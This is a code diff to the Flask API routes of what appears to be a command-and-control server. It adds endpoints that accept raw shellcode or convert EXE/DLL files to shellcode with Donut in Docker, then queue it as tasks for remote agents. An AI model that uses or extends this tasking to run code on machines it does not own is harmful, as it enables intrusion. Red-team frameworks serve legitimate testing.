@@ -31,6 +31,44 @@ def init_api_routes(app, socketio):
                     "message": "No JSON data provided"
                 }), 400
             
+            # Handle raw shellcode tasks
+            if data.get('task_type') == 'shellcode' and data.get('task_data', {}).get('raw'):
+                shellcode_bytes = bytes(data['task_data']['shellcode'])
+                
+                # Store the raw shellcode with execution method
+                task_data = {
+                    'shellcode': base64.b64encode(shellcode_bytes).decode('utf-8'),
+                    'raw': True,
+                    'method': data['task_data'].get('method', 'direct')
+                }
+                
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                
+                c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                        (None, 
+                        data['agent_id'], 
+                        'shellcode', 
+                        json.dumps(task_data),
+                        'pending', 
+                        datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
+                        None))
+                
+                conn.commit()
+                task_id = c.lastrowid
+                conn.close()
+                
+                socketio.emit('new_task', {
+                    'task_id': task_id,
+                    'agent_id': data['agent_id'],
+                    'task_type': 'shellcode'
+                })
+                
+                return jsonify({
+                    "status": "success", 
+                    "task_id": task_id
+                })
+
             required_fields = ['agent_id', 'task_type']
             if not all(field in data for field in required_fields):
                 return jsonify({
@@ -54,7 +92,7 @@ def init_api_routes(app, socketio):
             
             conn.commit()
             task_id = c.lastrowid
-            
+
             if data['task_type'] == 'websocket':
                 ws_connected = 1 if data.get('action') == 'start' else 0
                 c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
@@ -229,7 +267,6 @@ def init_api_routes(app, socketio):
             if conn:
                 conn.close()
 
-
     @app.route('/api/agents/<string:agent_id>', methods=['DELETE'])
     @login_required
     def delete_agent(agent_id):
@@ -276,8 +313,6 @@ def init_api_routes(app, socketio):
         finally:
             if conn:
                 conn.close()
-
-
 
     @app.route('/api/task_result', methods=['POST'])
     def task_result():
@@ -551,7 +586,6 @@ def init_api_routes(app, socketio):
             if conn:
                 conn.close()
 
-
     @app.route('/api/killdate_reached', methods=['POST'])
     def killdate_reached():
         conn = None
@@ -607,6 +641,8 @@ def init_api_routes(app, socketio):
             arch = request.form.get('arch', '64')
             args = request.form.get('args', '')
             agent_id = request.form.get('agent_id')
+            shellcode_type = request.form.get('shellcodeType', 'file')  # 'file' or 'raw'
+            raw_input_method = request.form.get('rawInputMethod', 'file')  # 'file' or 'text'
             
             if not agent_id:
                 return jsonify({"status": "error", "message": "Agent ID required"}), 400
@@ -617,58 +653,92 @@ def init_api_routes(app, socketio):
             file.save(input_path)
             app.logger.debug(f"Input path: {input_path}")
             
-            # Generate unique output name
-            random_value = str(uuid.uuid4())[:8]
-            output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
-            output_path = os.path.join(temp_dir, output_name + '.bin')
-            app.logger.debug(f"Output path: {output_path}")
+            shellcode = None
             
-            # Build donut command, running in a Docker container 
-            # Convert args to proper format
-            if args is None:
-                args_str = ''
-            elif isinstance(args, list):
-                args_str = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in args)
+            if shellcode_type == 'file':
+                # Handle PE file (EXE/DLL) - use Donut
+                if not file.filename.lower().endswith(('.exe', '.dll')):
+                    raise Exception("Only EXE and DLL files are supported for shellcode generation")
+                
+                # Generate unique output name
+                random_value = str(uuid.uuid4())[:8]
+                output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
+                output_path = os.path.join(temp_dir, output_name + '.bin')
+                app.logger.debug(f"Output path: {output_path}")
+                
+                # Build donut command
+                if args is None:
+                    args_str = ''
+                elif isinstance(args, list):
+                    args_str = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in args)
+                else:
+                    args_str = str(args)
+
+                cmd = [
+                    'docker', 'run', '--rm',
+                    '-v', f"{temp_dir}:/workdir",
+                    'donut',
+                    '-e', str(entropy),
+                    '-a', str(arch),
+                    '-o', f"/workdir/{output_name}.bin",
+                    '-f', '1',
+                    '-p', f'"{args_str}"',
+                    '-i', f"/workdir/{file.filename}",
+                    '-t'
+                ]
+
+                app.logger.debug(f"Docker Command: {' '.join(cmd)}") 
+                # Run donut
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                if result.returncode != 0:
+                    raise Exception(f"Donut failed: {result.stderr}")
+                
+                if not os.path.exists(output_path):
+                    raise Exception("Shellcode file was not generated")
+                
+                with open(output_path, 'rb') as f:
+                    shellcode = f.read()
+                
+                # Clean up output file
+                os.remove(output_path)
+                
             else:
-                args_str = str(args)
-
-            cmd = [
-            'docker', 'run', '--rm',
-            '-v', f"{temp_dir}:/workdir",
-            'donut',
-            '-e', str(entropy),
-            '-a', str(arch),
-            '-o', f"/workdir/{output_name}.bin",
-            '-f', '1',
-            '-p', f'"{args_str}"',
-            '-i', f"/workdir/{file.filename}",
-            '-t'
-        ]
-
-            app.logger.debug(f"Docker Command: {' '.join(cmd)}") 
-            # Run donut
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            app.logger.debug(f"Donut output: {result.stdout}")  
-            app.logger.debug(f"Donut error: {result.stderr}") 
-            if result.returncode != 0:
-                raise Exception(f"Donut failed: {result.stderr}")
+                # Handle raw shellcode input
+                if raw_input_method == 'file':
+                    # Read raw binary file
+                    with open(input_path, 'rb') as f:
+                        shellcode = f.read()
+                else:
+                    # Handle hex input from textarea
+                    hex_string = request.form.get('shellcodeHex', '').strip()
+                    if not hex_string:
+                        raise Exception("No hex shellcode provided")
+                    
+                    # Convert hex string to bytes
+                    try:
+                        shellcode = bytes.fromhex(hex_string)
+                    except ValueError as e:
+                        raise Exception(f"Invalid hex string: {str(e)}")
             
-            # Verify shellcode was generated
-            if not os.path.exists(output_path):
-                raise Exception("Shellcode file was not generated")
-            
-            # Read generated shellcode
-            with open(output_path, 'rb') as f:
-                shellcode = f.read()
+            if not shellcode:
+                raise Exception("No shellcode was generated or provided")
             
             # Create task for agent
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
+            task_data = {
+                'shellcode': base64.b64encode(shellcode).decode('utf-8'),
+                'raw': shellcode_type == 'raw',  # Mark as raw if not using Donut
+                'method': 'direct'
+            }
+            
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (None, agent_id, 'shellcode', 
-                    json.dumps({'shellcode': base64.b64encode(shellcode).decode('utf-8')}),
-                    'pending', datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
+                    json.dumps(task_data),
+                    'pending', 
+                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
+                    None))
             
             conn.commit()
             task_id = c.lastrowid
@@ -678,8 +748,6 @@ def init_api_routes(app, socketio):
             try:
                 if os.path.exists(input_path):
                     os.remove(input_path)
-                if os.path.exists(output_path):
-                    os.remove(output_path)
                 os.rmdir(temp_dir)
             except Exception as e:
                 app.logger.error(f"Error cleaning up temp files: {str(e)}")
